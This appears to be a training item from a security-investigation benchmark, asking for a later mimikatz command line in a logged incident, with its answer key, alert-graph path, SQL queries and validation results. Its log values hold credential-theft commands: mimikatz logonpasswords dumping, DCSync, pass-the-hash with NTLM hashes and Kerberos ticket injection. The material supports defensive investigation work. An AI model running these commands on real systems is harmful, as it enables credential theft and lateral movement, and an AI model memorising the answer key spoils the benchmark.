@@ -1,0 +1,436 @@
+{
+  "id": "incident_39_train_036",
+  "source_file": "data/excytin-bench/huggingface/questions/train/incident_39_qa_incident_o1-ga_c42.json",
+  "index": 36,
+  "sha256": "51898e3bff27d9ff8efd0c5a129f65cf6eafc3ba35e09b27c5013e938f76b79b",
+  "split": "train",
+  "question_record": {
+    "context": "As part of investigating this incident, a file `mimikatz.exe` was detected being executed with this command line indicating intent to dump credentials. The Process ID was 5196. This might be an indicator of an attacker stealing credentials using this tool.",
+    "question": "Related to this alert, another process was executed with potential malicious intent. Can you provide the command line used during the later execution of the tool `mimikatz.exe`?",
+    "answer": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+    "solution": [
+      "A known credential theft tool `mimikatz.exe` was executed.",
+      "The attacker launched mimikatz with the command line `mimikatz.exe lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp exit` at `2024-06-27t14:33:38.0249949z`, with Process ID `4748`."
+    ],
+    "start_alert": 89,
+    "end_alert": 26,
+    "start_entities": [
+      67
+    ],
+    "end_entities": [
+      30
+    ],
+    "shortest_alert_path": [
+      89,
+      31,
+      26
+    ]
+  },
+  "graph_file": "data/excytin-bench/github/secgym/qagen/graph_files/incident_39.graphml",
+  "graph_sha256": "018dbb36a3bc8e4e9df16f3337868296c9796087303c2321abc4a2eda2b79d41",
+  "path": [
+    "89",
+    "31",
+    "26"
+  ],
+  "nodes": {
+    "67": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+    },
+    "89": {
+      "type": "alert",
+      "name": "Malicious credential theft tool execution detected",
+      "description": "A known credential theft tool execution command line was detected.\nEither the process itself or its command line indicated an intent to dump users' credentials, keys, plain-text passwords and more."
+    },
+    "31": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ExtractedFileName",
+      "value": "mimikatz.exe"
+    },
+    "26": {
+      "type": "alert",
+      "name": "Malicious credential theft tool execution detected",
+      "description": "A known credential theft tool execution command line was detected.\nEither the process itself or its command line indicated an intent to dump users' credentials, keys, plain-text passwords and more."
+    },
+    "30": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+    }
+  },
+  "interpretation": {
+    "alerts": 2,
+    "sql_steps_per_variant": 2,
+    "start_alternatives": [
+      {
+        "node": "67",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      }
+    ],
+    "target_concept": "Process_Identity",
+    "weak_links": [
+      "31"
+    ],
+    "scope": "official graph witness, not a proof of causality, actor identity or autonomous planning"
+  },
+  "merged_pm": "pm_803fa87f1c664890",
+  "merged_ems": [
+    "em_786437addb3952bb",
+    "em_011879f02f92abdd"
+  ],
+  "offline_validation": [
+    {
+      "variant": "from_Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "31",
+          "expected_present": true,
+          "values": [
+            "mimikatz.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+              "time": "2024-07-04 22:35:02.863113+00:00",
+              "matched_inputs": [
+                "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 7,
+          "expected_node": "30",
+          "expected_present": true,
+          "values": [
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb",
+              "time": "2024-07-04 22:35:00.671776+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "4112",
+                "CreatedTimeUtc": "2024-06-27T14:32:36.6706405Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "a2604763-f21a-3d7c-3683-4a9e082d7664",
+              "time": "2024-07-04 22:35:00.823035+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait",
+              "raw_components": {
+                "ProcessId": "7092",
+                "CreatedTimeUtc": "2024-06-27T14:32:46.4998999Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "de152a4c-24b9-e410-3e2e-4a72778417d8",
+              "time": "2024-07-04 22:35:01.182306+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+              "raw_components": {
+                "ProcessId": "5176",
+                "CreatedTimeUtc": "2024-06-27T14:33:32.4282796Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"kerberos::ptt C:\\M365DAttack\\Admin-Tickets\" exit"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "532a5162-7573-5642-fd2a-baddc2ed1360",
+              "time": "2024-07-04 22:35:02.584465+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+              "raw_components": {
+                "ProcessId": "5196",
+                "CreatedTimeUtc": "2024-06-27T14:32:35.4061023Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+              "time": "2024-07-04 22:35:02.863113+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "486b0923-0456-2841-3dd4-5b3d0f0d0dc9",
+              "time": "2024-07-04 22:35:03.557275+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+              },
+              "entity_index": 3,
+              "entity_ref": "5",
+              "roles": [],
+              "alert_id": "1fc0b386-f173-5013-b555-c128b2532e97",
+              "time": "2024-07-04 22:35:04.214786+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "live_validation": [
+    {
+      "variant": "route_6a15bc55ff15aad7",
+      "seed_concept": "Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_786437addb3952bb",
+          "status": "ok",
+          "candidate_count": 27,
+          "unique_values": [
+            "mimikatz.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+          "witnesses": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+              "time": "2024-07-16 22:34:45.974284+00:00",
+              "source_row_hash": "073cc4f694851a721e20ac4af1532a37fd8b6710de9e55439e671cd32b3a61bf",
+              "matched_inputs": [
+                "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+              "time": "2024-07-14 22:39:34.383069+00:00",
+              "source_row_hash": "09f38e38b987369f29c4c15584745d789f6aa33a836d5ef2360e4772d021f89c",
+              "matched_inputs": [
+                "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "mimikatz.exe",
+              "raw_components": {
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "80e1ce36-0e85-8e96-374b-706b848a201b",
+              "time": "2024-07-31 12:19:34.509864+00:00",
+              "source_row_hash": "0d470a00e97969e996d25674ad9a32dd937ee6b70e83b99121ce1abf347fea21",
+              "matched_inputs": [
+                "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'Command_File_Mention'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious credential theft tool execution detected",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_011879f02f92abdd",
+          "status": "ok",
+          "candidate_count": 189,
+          "unique_values": [
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb",
+              "time": "2024-07-17 22:34:53.814367+00:00",
+              "source_row_hash": "0432d3aa68114605d147c47480253099b2198aba37e5e10ba323dbabfb3508b0",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb",
+              "time": "2024-07-18 22:36:00.749673+00:00",
+              "source_row_hash": "047c3b22454fdda6fd604fe4d5d463b3848c5c21b886f487064a5a8bbf7a1533",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb",
+              "time": "2024-07-14 22:34:27.012891+00:00",
+              "source_row_hash": "0ae0992856293ba9f8e0277b89cc7dc4b013533af3db6b4ec2ce147cd464ef23",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Command_File_Mention' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious credential theft tool execution detected",
+            "mimikatz.exe"
+          ],
+          "error": null
+        }
+      ]
+    }
+  ],
+  "offline_scope": "Uses official start entities; no intermediate or target value supplied to queries. Expected values checked only after results.",
+  "live_scope": "Exported merged PM/EM; session-local MySQL projection of original CSV, membership from SecurityIncident.AlertIds. Official graph supplies seed, expected path checked only AFTER full route execution.",
+  "delta": {
+    "sm": 0,
+    "em": 0,
+    "pm": 1
+  },
+  "live_validation_v1": [
+    {
+      "variant": "from_Process_Identity",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 307 (char 306)",
+          "alert_id": "74460ba6-f705-313a-8103-bcfb17b903cb"
+        }
+      ]
+    }
+  ],
+  "physical_revision": 2,
+  "verification": "exact_alert_and_edge_lineage"
+}
